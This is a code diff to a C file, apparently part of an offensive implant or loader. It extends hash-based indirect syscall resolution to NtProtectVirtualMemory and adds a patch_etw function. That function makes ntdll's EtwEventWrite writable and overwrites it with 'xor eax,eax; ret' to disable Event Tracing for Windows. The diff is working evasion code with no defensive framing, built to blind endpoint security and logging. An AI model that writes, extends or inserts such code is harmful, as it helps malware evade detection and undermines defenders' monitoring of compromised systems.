@@ -135,6 +135,7 @@ BOOL resolve_syscalls(void) {
     ok &= resolve_one(ntdll, H_NtCreateFile, &g_ssn.NtCreateFile, &g_addr.NtCreateFile);
     ok &= resolve_one(ntdll, H_NtWriteFile, &g_ssn.NtWriteFile, &g_addr.NtWriteFile);
     ok &= resolve_one(ntdll, H_NtQuerySystemInformation, &g_ssn.NtQuerySystemInformation, &g_addr.NtQuerySystemInformation);
+    ok &= resolve_one(ntdll, H_NtProtectVirtualMemory, &g_ssn.NtProtectVirtualMemory, &g_addr.NtProtectVirtualMemory);
 
     return ok;
 }
@@ -191,4 +192,40 @@ NTSTATUS sys_NtWriteFile(HANDLE FileHandle, HANDLE Event, PVOID ApcRoutine,
     return indirect_syscall(g_ssn.NtWriteFile, g_addr.NtWriteFile,
                            FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock,
                            Buffer, Length, ByteOffset, Key);
+}
+
+NTSTATUS sys_NtProtectVirtualMemory(HANDLE ProcessHandle, PVOID *BaseAddress,
+                                     PSIZE_T RegionSize, ULONG NewProtect,
+                                     PULONG OldProtect) {
+    return indirect_syscall(g_ssn.NtProtectVirtualMemory, g_addr.NtProtectVirtualMemory,
+                           ProcessHandle, BaseAddress, RegionSize, NewProtect, OldProtect);
+}
+
+// Patch EtwEventWrite to return 0 (disable ETW tracing).
+// Overwrites the first 4 bytes with: xor eax,eax; ret (33 C0 C3 CC)
+BOOL patch_etw(void) {
+    PVOID ntdll = get_ntdll_base();
+    if (!ntdll) return FALSE;
+
+    PVOID etw_addr = get_export_by_hash(ntdll, H_EtwEventWrite);
+    if (!etw_addr) return FALSE;
+
+    // Make the page writable
+    PVOID base = etw_addr;
+    SIZE_T size = 4;
+    ULONG old_protect = 0;
+    NTSTATUS status = sys_NtProtectVirtualMemory(
+        (HANDLE)-1, &base, &size, 0x40 /*PAGE_EXECUTE_READWRITE*/, &old_protect);
+    if (status != 0) return FALSE;
+
+    // xor eax, eax; ret; int3
+    BYTE patch[] = { 0x33, 0xC0, 0xC3, 0xCC };
+    for (int i = 0; i < 4; i++)
+        ((BYTE *)etw_addr)[i] = patch[i];
+
+    // Restore original protection
+    sys_NtProtectVirtualMemory(
+        (HANDLE)-1, &base, &size, old_protect, &old_protect);
+
+    return TRUE;
 }
